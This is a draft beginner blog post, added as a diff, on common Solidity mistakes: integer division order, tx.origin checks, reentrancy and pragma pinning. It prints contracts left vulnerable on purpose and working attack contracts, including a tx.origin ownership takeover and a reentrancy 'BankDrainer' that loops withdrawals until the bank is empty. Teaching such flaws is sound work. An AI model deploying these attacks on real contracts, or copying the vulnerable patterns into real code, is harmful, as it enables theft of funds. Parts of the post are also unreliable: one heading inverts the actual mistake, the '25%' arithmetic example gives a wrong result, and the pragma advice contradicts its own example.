@@ -1,0 +1,167 @@
+---
+title: "Solidity: Common mistakes for beginners"
+date: "2025-05-17"
+tags: ["solidity", "beginner"]
+status: "draft"
+description: "This article explains some common mistakes that beginners make in Solidity"
+---
+
+## Division before multiplication
+
+In Solidity, division always rounds down to the nearest whole number (_0.333 rounds down to 0_).
+This can lead to unintended zero values or significant precision loss if you're not careful with the order of operations.
+
+Let's say you want to calculate 25% of a value. A common mistake is doing the division before the multiplication, like this:
+
+```solidity
+uint256 portion = value / 4 * 100;
+```
+
+If value is less than 4, `value / 4` will be 0, and multiplying that by 100 still gives 0.
+Even with larger values, the rounding can reduce accuracy.
+
+```solidity
+uint256 value = 3;
+
+uint256 portion = value / 4 * 100; // portion = 0 ❌ [!code --]
+
+uint256 portion = value * 100 / 4; // portion = 75 ✅ [!code ++]
+```
+
+Multiplying first preserves precision because no rounding occurs before the larger operation:
+
+```solidity
+// Wrong:
+value = 3
+portion = 3 / 4 * 100 = 0 * 100 = 0
+
+// Right:
+portion = 3 * 100 / 4 = 300 / 4 = 75
+```
+
+## Using `msg.sender` instead of `tx.origin`
+
+`tx.origin` is a global variable which returns the address that created the original transaction.
+
+**_EXAMPLE_** if User calls `Contract A`, which then calls `contract B` within the same transaction -- when checked from inside `Contract B`:
+
+- `msg.sender` will be equal to `Contract A` .
+- `tx.origin` will be the `User` regardless of where you check it from.
+
+![tx.origin vs msg.sender](https://cdn.hashnode.com/res/hashnode/image/upload/v1747671803583/983cc0a0-b8d0-4724-847a-2761fb756a32.png)
+
+Let's build and hack this example
+
+```solidity
+contract Good {
+    address public owner;
+
+    constructor() {
+        owner = msg.sender;
+    }
+
+    function setOwner(address newOwner) public {
+        require(tx.origin == owner, "Not owner");
+        owner = newOwner;
+    }
+}
+```
+
+```solidity
+import "./Good.sol";
+
+contract Attack {
+    Good public good;
+
+    constructor(address _good) {
+        good = Good(_good);
+    }
+
+    function attack() public {
+        good.setOwner(address(this));
+    }
+}
+```
+
+The attack will happen as follows
+
+1. initially `address1` will deploy `Good.sol` and will be the owner
+2. The attacker will **somehow fool the user** who has the private key of `address1` to call the `attack` function with `Attack.sol`.
+3. When the user calls `attack` function with `address1`, `tx.origin` is set to `address1`. `attack` function further calls `setOwner` function of `Good.sol` which first checks if `tx.origin` is indeed the owner which is `true` because the original transaction was indeed called by `address1`. After verifying the owner, it sets the owner to `Attack.sol`
+4. thus attacker is successfully able to change the owner of `Good.sol` 🤯
+
+## Not Following Check-effects-interaction
+
+In Solidity, following the “check-effects-interaction” pattern is crucial to prevent **re-entrancy attacks**.
+This means that calling another contract or sending ETH to another address should be the last operation in a function.
+Failure to do so can leave the contract vulnerable to malicious attacks.
+
+The following contract `BadBank` does not follow check-effects-interaction and thus can be drained of ETH.
+
+```solidity
+pragma solidity 0.8.26;
+
+contract BadBank {
+    mapping(address => uint256) public balances;
+
+    constructor() payable {
+        require(msg.value == 10 ether, "deposit 10 eth");
+    }
+
+    function deposit() external payable {
+        balances[msg.sender] += msg.value;
+    }
+
+    function withdraw() external {
+        (bool ok, ) = msg.sender.call{value: balances[msg.sender]}("");
+        require(ok, "transfer failed");
+        balances[msg.sender] = 0;
+    }
+}
+```
+
+The following attack contract can be used to drain the bank:
+
+```solidity
+contract BankDrainer {
+    function steal(BadBank bank) external payable {
+        require(msg.value == 1 ether, "send deposit 1 eth");
+        bank.deposit{value: 1 ether}();
+        bank.withdraw();
+    }
+
+    receive() external payable {
+        // msg.sender is the BadBank because the BadBank
+        // called `receive()` when it transfered either
+
+        while (msg.sender.balance >= 1 ether) {
+            BadBank(msg.sender).withdraw();
+        }
+    }
+}
+```
+
+The attack will happen as follows
+
+![reentrancy attack](https://cdn.hashnode.com/res/hashnode/image/upload/v1747674296941/5c103494-375a-4975-80ee-648533a6fa56.png)
+
+## Not Fixing the Solidity Pragma
+
+When you read the code of Solidity libraries, you'll often see something like this or similar at the top.
+Because of this, newer developers tend to blindly copy this pattern.
+
+```solidity
+//SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+```
+
+However, setting the Solidity version with `^0.8.0` is **only appropriate for libraries**.
+The author distributing the library doesn't know the exact version a later programmer will compile it with, so they only set a minimum version.
+
+As a developer deploying the application, you know which version of the compiler you are using to compile the code.
+Therefore you **should lock the version to the exact one** `0.8.0` you used so it's clearer to others auditing the code which version of the Solidity compiler you used.
+
+```solidity
+pragma solidity ^0.8.0; // ❌ [!code --]
+pragma solidity 0.8.21; // ✅  [!code ++]
+```
